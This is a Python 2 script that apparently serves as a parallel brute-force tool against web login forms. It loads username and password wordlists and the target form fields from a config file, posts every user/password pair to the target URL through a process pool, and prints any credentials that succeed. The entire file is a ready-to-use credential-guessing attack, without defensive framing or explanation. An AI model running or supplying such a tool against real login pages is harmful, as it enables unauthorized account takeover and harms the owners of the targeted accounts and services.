#!/usr/bin/python
import re
import sys
import time
import base64
import requests
import configparser
from multiprocessing import Pool
from requests.auth import HTTPBasicAuth

users, words = [], []
parallel_num = 1
failure_pattern = None
url = ''
username_field = ''
password_field = ''
req_headers = {}
other_post_data = {}

test = 0

def loadConf(conf_path):
    global users, words, parallel_num, failure_pattern, url
    global username_field, password_field
    global req_headers, other_post_data
    config = configparser.ConfigParser()
    config.read(conf_path)
    #with open(config['UsernameFile'])
    users, words = [], []
    with open(config['CONF']['UsernameFile'], 'r') as ufile:
        for u in ufile:
            users.append(u.strip())
    with open(config['CONF']['PasswordFile'], 'r') as pwfile:
        for pw in pwfile:
            words.append(pw.strip())
    parallel_num = config['CONF'].getint('ParallelNum')
    failure_pattern = re.compile(config['CONF']['FailurePatternRegex'])
    url = config['CONF']['URL']
    username_field = config['CONF']['UsernameField']
    password_field = config['CONF']['PasswordField']

    for (k, v) in config['RequestHeader'].items():
        req_headers[k] = v
    for (k, v) in config['OtherPostData'].items():
        other_post_data[k] = v
    print 'Failure Symbol:%s' % config['CONF']['FailurePatternRegex']
    print 'Load Conf Successful.'


def loginAttempt(user, passwd):
    postData = {}
    postData.update(other_post_data)
    postData.update({username_field:user, password_field:passwd})
    r = requests.post(url, headers = req_headers, data=postData)
    if test:
        print r.status_code, r.text
        succ = True
    else:
        succ = r.status_code < 400 and not failure_pattern.search(r.text)
        if succ:
            print r.status_code, r.text
    return succ


#######################################################################
#                                                                     #
#      Don't need to change any code below this block.                #
#                                                                     #
#######################################################################
Found = False
def crack(auth):
    global Found
    if Found: return False
    user = auth[0]
    passwd = auth[1]
    retry = 3
    while retry > 0 and user in users and not Found:
        try:
            if loginAttempt(user, passwd):
                print 'Successful:%s:%s' % (user, passwd)
                users.remove(user)
                Found = True
            retry = 0
        except:
            retry -= 1

    return Found

def parallel(poolSize):
    p = Pool(poolSize)
    t0 = time.time()
    batch_size = int(1000 / len(users)) if len(users) < 1000 else 1
    for i in xrange(0, len(words), batch_size):
        sz = min(batch_size, len(words) - i)

        def credGenerator():
            for p in words[i:(i+sz)]:
                for u in users:
                    yield (u,p)

        ti = time.time()
        p.map(crack, credGenerator())
        tp = time.time()
        print i+sz, tp-ti, tp-t0

if __name__ == '__main__':
    if len(sys.argv) == 2:
        loadConf(sys.argv[1])
        parallel(parallel_num)
    else:
        print 'Usage: %s [conf]' % sys.argv[0]
        exit(1)
